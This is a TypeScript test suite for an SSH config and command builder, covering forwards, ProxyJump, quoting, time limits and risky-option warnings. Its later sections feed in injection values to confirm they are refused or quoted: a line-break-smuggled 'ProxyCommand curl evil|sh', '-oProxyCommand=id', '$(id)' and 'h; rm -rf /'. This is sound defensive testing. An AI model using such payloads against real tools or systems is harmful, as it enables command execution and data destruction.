import assert from "node:assert/strict";
import {
  emptyBlock,
  emptyForward,
  parsePort,
  renderBlock,
  renderConfig,
  sshCommand,
  validateBlock,
  configWarnings,
  type HostBlock,
} from "../../client/src/lib/toolkit/ssh-config-builder.ts";

let count = 0;
function eq<T>(a: T, b: T, msg?: string) {
  assert.deepStrictEqual(a, b, msg);
  count += 1;
}
function ok(v: unknown, msg?: string) {
  assert.ok(v, msg);
  count += 1;
}

// parsePort covers the 1..65535 boundary (TCP ports).
eq(parsePort("22"), 22);
eq(parsePort("65535"), 65535);
eq(parsePort("1"), 1);
eq(parsePort("0"), null);
eq(parsePort("65536"), null);
eq(parsePort("-1"), null);
eq(parsePort("abc"), null);
eq(parsePort(""), null);

// A full block renders the keywords it has, indented, with Host first.
const block: HostBlock = {
  ...emptyBlock(),
  host: "app",
  hostName: "10.0.4.12",
  user: "deploy",
  port: "2222",
  identityFile: "~/.ssh/id_ed25519",
  identitiesOnly: true,
  proxyJump: "bastion",
  forwardAgent: false,
  forwards: [
    { kind: "local", bindAddress: "", listenPort: "5432", destHost: "db.internal", destPort: "5432" },
    { kind: "dynamic", bindAddress: "127.0.0.1", listenPort: "1080", destHost: "", destPort: "" },
  ],
  serverAliveInterval: "60",
  controlMaster: "auto",
  controlPath: "~/.ssh/cm-%r@%h:%p",
  controlPersist: "10m",
  strictHostKeyChecking: "accept-new",
};

const text = renderBlock(block);
ok(text.startsWith("Host app\n"), "Host line first");
ok(text.includes("    HostName 10.0.4.12"), "indented HostName");
ok(text.includes("    Port 2222"));
ok(text.includes("    IdentitiesOnly yes"));
ok(text.includes("    ProxyJump bastion"));
ok(text.includes("    LocalForward 5432 db.internal:5432"), "local forward rendering");
ok(text.includes("    DynamicForward 127.0.0.1:1080"), "dynamic forward with bind");
ok(text.includes("    ControlPersist 10m"));
ok(text.includes("    StrictHostKeyChecking accept-new"));
ok(!text.includes("ForwardAgent"), "ForwardAgent omitted when off");

// The one-off command reproduces the same connection.
const cmd = sshCommand(block);
ok(cmd.startsWith("ssh "), "starts with ssh");
ok(cmd.includes("-p 2222"));
ok(cmd.includes("-i ~/.ssh/id_ed25519"));
ok(cmd.includes("-o IdentitiesOnly=yes"));
ok(cmd.includes("-J bastion"));
ok(cmd.includes("-L 5432:db.internal:5432"), "local forward flag");
ok(cmd.includes("-D 127.0.0.1:1080"), "dynamic forward flag");
ok(cmd.includes("-o ServerAliveInterval=60"));
ok(cmd.includes("-o StrictHostKeyChecking=accept-new"));
ok(cmd.endsWith("deploy@10.0.4.12"), "user@host destination");

// A remote forward uses -R.
const rf = { ...emptyBlock(), host: "edge", hostName: "edge.example", forwards: [emptyForward("remote")] };
rf.forwards[0] = { kind: "remote", bindAddress: "", listenPort: "8080", destHost: "localhost", destPort: "80" };
ok(renderBlock(rf).includes("    RemoteForward 8080 localhost:80"));
ok(sshCommand(rf).includes("-R 8080:localhost:80"));

// A wildcard host with no HostName yields a placeholder target, not a bad one.
const wild = { ...emptyBlock(), host: "*.internal", user: "admin" };
ok(sshCommand(wild).endsWith("admin@HOST"), "placeholder for wildcard target");

// Validation rejects a bad port and a missing host pattern.
const bad = { ...emptyBlock(), host: "", port: "70000", serverAliveInterval: "x" };
const errs = validateBlock(bad);
ok(errs.some((e) => e.field === "host"));
ok(errs.some((e) => e.field === "port"));
ok(errs.some((e) => e.field === "serverAliveInterval"));

// A forward missing its destination is reported.
const badFwd = { ...emptyBlock(), host: "a", forwards: [{ kind: "local" as const, bindAddress: "", listenPort: "80", destHost: "", destPort: "" }] };
ok(validateBlock(badFwd).some((e) => e.field === "forward-0-host"));

// configWarnings flags Host * placed before specific blocks.
const warnOrder = configWarnings([
  { ...emptyBlock(), host: "*", serverAliveInterval: "30" },
  { ...emptyBlock(), host: "app" },
]);
ok(warnOrder.some((w) => w.title.includes("Host *")), "ordering warning");

// configWarnings flags ForwardAgent and StrictHostKeyChecking no.
const warnRisk = configWarnings([{ ...emptyBlock(), host: "box", forwardAgent: true, strictHostKeyChecking: "no" }]);
ok(warnRisk.some((w) => w.title.includes("ForwardAgent")));
ok(warnRisk.some((w) => w.tone === "danger" && w.title.includes("StrictHostKeyChecking")));

// renderConfig separates blocks with a blank line.
const two = renderConfig([{ ...emptyBlock(), host: "a", hostName: "1.1.1.1" }, { ...emptyBlock(), host: "b", hostName: "2.2.2.2" }]);
ok(two.includes("Host a\n    HostName 1.1.1.1\n\nHost b"), "blocks joined by blank line");

// ---------------------------------------------------------------------------
// Independent verifier cases, from ssh_config(5) and ssh(1).
// ---------------------------------------------------------------------------

// V1. A two-hop ProxyJump chain renders as a comma list in both forms, and the
// one-off uses -J (ssh(1): -J [user@]host[:port][,...]).
{
  const b: HostBlock = { ...emptyBlock(), host: "inner", hostName: "10.1.1.9", proxyJump: "b1,b2" };
  ok(renderBlock(b).includes("    ProxyJump b1,b2"));
  ok(sshCommand(b).includes("-J b1,b2"));
}

// V2. A LocalForward with a bind address keeps the bind on the listen side in
// both the config and the -L flag (ssh(1): -L [bind:]port:host:hostport).
{
  const b: HostBlock = {
    ...emptyBlock(),
    host: "db",
    hostName: "h",
    forwards: [{ kind: "local", bindAddress: "127.0.0.1", listenPort: "8080", destHost: "10.0.0.5", destPort: "80" }],
  };
  ok(renderBlock(b).includes("    LocalForward 127.0.0.1:8080 10.0.0.5:80"));
  ok(sshCommand(b).includes("-L 127.0.0.1:8080:10.0.0.5:80"));
}

// V3. A dynamic forward with no bind renders just the port (SOCKS proxy).
{
  const b: HostBlock = { ...emptyBlock(), host: "socks", hostName: "h", forwards: [{ kind: "dynamic", bindAddress: "", listenPort: "1080", destHost: "", destPort: "" }] };
  ok(renderBlock(b).includes("    DynamicForward 1080"));
  ok(sshCommand(b).includes("-D 1080"));
  ok(!sshCommand(b).includes("-L"), "dynamic forward is not a local forward");
}

// V4. ControlPersist accepts yes, no and time forms, and rejects junk
// (ssh_config(5): yes, no, or a time specification).
for (const good of ["yes", "no", "600", "10m", "1h", "30s"]) {
  const errs = validateBlock({ ...emptyBlock(), host: "h", controlPersist: good });
  ok(!errs.some((e) => e.field === "controlPersist"), `ControlPersist ${good} is valid`);
}
for (const bad of ["soon", "10x", "-5", "10 m"]) {
  const errs = validateBlock({ ...emptyBlock(), host: "h", controlPersist: bad });
  ok(errs.some((e) => e.field === "controlPersist"), `ControlPersist ${bad} is rejected`);
}

// V4b. OpenSSH reads times with convtime(), which rejects anything above INT_MAX seconds (misc.c).
const INT_MAX = 2147483647;
ok(!validateBlock({ ...emptyBlock(), host: "h", serverAliveInterval: String(INT_MAX) }).some((e) => e.field === "serverAliveInterval"), "ServerAliveInterval at INT_MAX is valid");
ok(validateBlock({ ...emptyBlock(), host: "h", serverAliveInterval: String(INT_MAX + 1) }).some((e) => e.field === "serverAliveInterval"), "ServerAliveInterval above INT_MAX is rejected");
ok(validateBlock({ ...emptyBlock(), host: "h", serverAliveInterval: "99999999999999999999" }).some((e) => e.field === "serverAliveInterval"), "an oversized digit string is rejected");
ok(!validateBlock({ ...emptyBlock(), host: "h", controlPersist: String(INT_MAX) }).some((e) => e.field === "controlPersist"), "ControlPersist at INT_MAX seconds is valid");
ok(validateBlock({ ...emptyBlock(), host: "h", controlPersist: String(INT_MAX + 1) }).some((e) => e.field === "controlPersist"), "ControlPersist above INT_MAX seconds is rejected");
// With a unit the total in seconds is what counts: 596523 hours fits, 596524 hours does not.
ok(!validateBlock({ ...emptyBlock(), host: "h", controlPersist: "596523h" }).some((e) => e.field === "controlPersist"), "596523h fits");
ok(validateBlock({ ...emptyBlock(), host: "h", controlPersist: "596524h" }).some((e) => e.field === "controlPersist"), "596524h does not");
ok(validateBlock({ ...emptyBlock(), host: "h", controlPersist: "35791395m" }).some((e) => e.field === "controlPersist"), "35791395m does not");
// An oversized value stays out of the copyable command, so ssh never prints "invalid time value".
{
  const oversized = { ...emptyBlock(), host: "h", hostName: "h.example", serverAliveInterval: String(INT_MAX + 1), controlPersist: String(INT_MAX + 1) };
  const cmd = sshCommand(oversized);
  ok(!cmd.includes("ServerAliveInterval") && !cmd.includes("ControlPersist"), `oversized times left out: ${cmd}`);
}

// V4c. A value with a space, quote, backslash or hash must survive ssh's own tokenizer as ONE argument.
// argvSplit is a port of argv_split() from OpenSSH misc.c (terminate_on_comment = 1), which readconf.c
// uses for every config line and for -o values.
function argvSplit(line: string): string[] | null {
  const argv: string[] = [];
  for (let i = 0; i < line.length; i++) {
    if (line[i] === " " || line[i] === "\t") continue;
    if (line[i] === "#") break;
    let quote = "";
    let arg = "";
    for (; i < line.length; i++) {
      const c = line[i];
      if (c === "\\") {
        const n = line[i + 1];
        if (n === "'" || n === '"' || n === "\\" || (quote === "" && n === " ")) {
          i++;
          arg += line[i];
        } else {
          arg += c;
        }
      } else if (quote === "" && (c === " " || c === "\t")) break;
      else if (quote === "" && (c === '"' || c === "'")) quote = c;
      else if (quote !== "" && c === quote) quote = "";
      else arg += c;
    }
    if (i >= line.length && quote !== "") return null;
    argv.push(arg);
  }
  return argv;
}
// A shell that only knows single quotes, as shellQuote writes them, to get what ssh would receive.
function shellWords(command: string): string[] {
  const words: string[] = [];
  let cur = "";
  let inWord = false;
  let q = false;
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (q) { if (c === "'") q = false; else cur += c; }
    else if (c === "\\" && i + 1 < command.length) { cur += command[++i]; inWord = true; }
    else if (c === "'") { q = true; inWord = true; }
    else if (c === " ") { if (inWord) { words.push(cur); cur = ""; inWord = false; } }
    else { cur += c; inWord = true; }
  }
  if (inWord) words.push(cur);
  return words;
}
const awkward = [
  "/tmp/key with space",
  "/home/a b/.ssh/id ed25519",
  'a"quote',
  "it's",
  "C:\\Users\\me\\.ssh\\id",
  "C:\\\\server\\share\\key",
  "back\\slash at end\\",
  "#startswith hash",
  "tab\there",
  "~/.ssh/cm-%r@%h:%p",
  "~/.ssh/id_ed25519",
  "ünï cödé/key file",
];
for (const value of awkward) {
  const hasTab = value.includes("\t");
  const b = { ...emptyBlock(), host: "h", hostName: "h.example", identityFile: value, controlPath: value };
  const lines = renderBlock(b).split("\n").map((l) => l.trim());
  const identity = lines.find((l) => l.startsWith("IdentityFile "))!;
  const cpath = lines.find((l) => l.startsWith("ControlPath "))!;
  // A tab is a control character, so it is refused rather than written.
  if (hasTab) {
    eq(identity, undefined, "a value with a tab is not written as IdentityFile");
    eq(cpath, undefined, "a value with a tab is not written as ControlPath");
    continue;
  }
  eq(argvSplit(identity), ["IdentityFile", value.trim()], `IdentityFile ${JSON.stringify(value)} is one argument`);
  eq(argvSplit(cpath), ["ControlPath", value.trim()], `ControlPath ${JSON.stringify(value)} is one argument`);
  // The command: -i takes the path directly, -o goes through the same tokenizer as a config line.
  const words = shellWords(sshCommand(b));
  eq(words[words.indexOf("-i") + 1], value.trim(), `-i ${JSON.stringify(value)} reaches ssh intact`);
  const opt = words[words.findIndex((w) => w.startsWith("ControlPath=")) ];
  const decoded = argvSplit(opt.replace("=", " "));
  eq(decoded, ["ControlPath", value.trim()], `-o ControlPath for ${JSON.stringify(value)} is one argument`);
}
eq(renderBlock({ ...emptyBlock(), host: "h", identityFile: "/tmp/key with space" }).includes('IdentityFile "/tmp/key with space"'), true, "space gets double quotes");
eq(renderBlock({ ...emptyBlock(), host: "h", identityFile: "~/.ssh/id_ed25519" }).includes("IdentityFile ~/.ssh/id_ed25519"), true, "an ordinary path stays unquoted");
eq(renderBlock({ ...emptyBlock(), host: "h", proxyJump: "a b" }).includes('ProxyJump "a b"'), true, "ProxyJump with a space is one argument");

// V4d. A line break would end the line and start a new keyword: it is refused and flagged, never written.
for (const [field, label] of [["identityFile", "IdentityFile"], ["controlPath", "ControlPath"], ["proxyJump", "ProxyJump"]] as const) {
  const hostile = { ...emptyBlock(), host: "h", [field]: "x\nProxyCommand curl evil|sh" } as HostBlock;
  ok(validateBlock(hostile).some((e) => e.field === field), `${label} with a line break is flagged`);
  const text = renderBlock(hostile);
  ok(!text.includes("ProxyCommand"), `${label} with a line break never writes the second keyword`);
  ok(!sshCommand(hostile).includes("ProxyCommand"), `${label} with a line break stays out of the command`);
}
{
  const hostile = { ...emptyBlock(), host: "a\nProxyCommand evil", hostName: "h.example" };
  ok(validateBlock(hostile).some((e) => e.field === "host" && /line break/.test(e.message)), "Host with a line break is flagged");
  ok(!renderBlock(hostile).includes("ProxyCommand"), "Host with a line break never writes the second keyword");
  ok(renderBlock(hostile).startsWith("Host unnamed"), "Host falls back to the placeholder");
}

// V5. IdentitiesOnly emits a boolean keyword and the matching -o option.
{
  const b: HostBlock = { ...emptyBlock(), host: "h", hostName: "x", identitiesOnly: true, identityFile: "~/.ssh/k" };
  ok(renderBlock(b).includes("    IdentitiesOnly yes"));
  ok(sshCommand(b).includes("-o IdentitiesOnly=yes"));
  ok(sshCommand(b).includes("-i ~/.ssh/k"));
}

// V6. A Host * block in the last position produces no ordering warning, but
// earlier does (first-match-wins precedence).
{
  const last = configWarnings([{ ...emptyBlock(), host: "app" }, { ...emptyBlock(), host: "*", user: "root" }]);
  ok(!last.some((w) => w.title.includes("Host *")), "Host * last is fine");
}

// V7. A spaced identity path is shell-quoted in the one-off command so it stays
// a single argument.
{
  const b: HostBlock = { ...emptyBlock(), host: "h", hostName: "x", identityFile: "~/my keys/id" };
  ok(sshCommand(b).includes("-i '~/my keys/id'"), "spaced path quoted");
}

// V8. An empty set renders to an empty string without throwing.
eq(renderConfig([]), "");

// V9. ForwardAgent and StrictHostKeyChecking off both raise findings, and the
// host-key-off one is the more severe (danger) of the two.
{
  const w = configWarnings([{ ...emptyBlock(), host: "box", forwardAgent: true, strictHostKeyChecking: "off" }]);
  ok(w.some((x) => x.title.includes("ForwardAgent") && x.tone === "warn"));
  ok(w.some((x) => x.title.includes("StrictHostKeyChecking") && x.tone === "danger"));
}

// V10. A remote forward reproduces with -R, distinct from -L.
{
  const b: HostBlock = { ...emptyBlock(), host: "h", hostName: "x", forwards: [{ kind: "remote", bindAddress: "", listenPort: "9000", destHost: "127.0.0.1", destPort: "3000" }] };
  ok(sshCommand(b).includes("-R 9000:127.0.0.1:3000"));
  ok(!sshCommand(b).includes("-L "));
}

// V11. parsePort rejects whitespace, signs and overflow but accepts the bounds.
eq(parsePort(" 22 "), 22, "surrounding whitespace is trimmed");
eq(parsePort("+22"), null);
eq(parsePort("22.5"), null);
eq(parsePort("99999999999999999999"), null);

// The one-off command is pasted into a terminal. A destination, login or argument that could not be one is
// replaced or quoted, and a destination that starts with a hyphen (ssh would read it as an option) never appears.
{
  const base = (patch: Partial<HostBlock>): HostBlock => ({ ...emptyBlock(), host: "h", hostName: "host.example.com", ...patch });
  for (const hostile of ["server.example; touch /tmp/x", "-oProxyCommand=id", "a b", "$(id)", "`id`", "h|id", "h&&id", "h'x", 'h"x', "h>o", "-h"]) {
    eq(sshCommand(base({ hostName: hostile })), "ssh HOST", `HostName ${JSON.stringify(hostile)}`);
    ok(validateBlock(base({ hostName: hostile })).some((e) => e.field === "hostName"), `error for HostName ${hostile}`);
  }
  for (const hostile of ["x; id", "-oProxyCommand=id", "a b", "$(id)", "u'", "-l"]) {
    eq(sshCommand(base({ user: hostile })), "ssh USER@host.example.com", `User ${JSON.stringify(hostile)}`);
    ok(validateBlock(base({ user: hostile })).some((e) => e.field === "user"), `error for User ${hostile}`);
  }
  // A Host alias used as the target is held to the same rule.
  eq(sshCommand({ ...emptyBlock(), host: "x;id", hostName: "" }), "ssh HOST");
  eq(sshCommand({ ...emptyBlock(), host: "-oProxyCommand=id", hostName: "" }), "ssh HOST");
  // Valid names and addresses pass through untouched.
  for (const good of ["10.0.4.12", "host.example.com", "fe80::1%eth0", "2001:db8::1", "my_host-1.lan", "A.B-c.d"]) {
    eq(sshCommand(base({ hostName: good, user: "deploy" })), `ssh deploy@${good}`, `HostName ${good}`);
    eq(validateBlock(base({ hostName: good })).filter((e) => e.field === "hostName").length, 0, good);
  }
  // Forward targets, bind addresses and option values are quoted rather than pasted in raw.
  const fwd = (patch: Partial<HostBlock["forwards"][number]>) =>
    base({ forwards: [{ kind: "local", bindAddress: "", listenPort: "8080", destHost: "db.internal", destPort: "5432", ...patch }] });
  ok(sshCommand(fwd({ destHost: "h; rm -rf /" })).includes("-L '8080:h; rm -rf /:5432'"), "hostile forward host quoted");
  ok(validateBlock(fwd({ destHost: "h; rm -rf /" })).some((e) => e.field === "forward-0-host"), "forward host error");
  ok(sshCommand(fwd({ bindAddress: "x;id" })).includes("-L 'x;id:8080:db.internal:5432'"), "hostile bind quoted");
  ok(validateBlock(fwd({ bindAddress: "x;id" })).some((e) => e.field === "forward-0-bind"), "bind error");
  ok(sshCommand(fwd({ destHost: "[::1]" })).includes("-L '8080:[::1]:5432'"), "bracketed IPv6 forward is quoted for the shell and valid");
  eq(validateBlock(fwd({ destHost: "[::1]", bindAddress: "*" })).length, 0, "bracketed IPv6 and * bind are valid");
  ok(sshCommand(fwd({})).includes("-L 8080:db.internal:5432"), "an ordinary forward stays unquoted");
  ok(!sshCommand(base({ controlPersist: "10m; id" })).includes("ControlPersist"), "a hostile ControlPersist never reaches the command");
  ok(sshCommand(base({ controlPersist: "10m" })).includes("-o ControlPersist=10m"), "ControlPersist ordinary stays unquoted");
  ok(sshCommand(base({ forwards: [{ kind: "dynamic", bindAddress: "x;id", listenPort: "1080", destHost: "", destPort: "" }] })).includes("-D 'x;id:1080'"), "dynamic bind quoted");
}

console.log(`ssh-config-builder: ${count} assertions passed`);
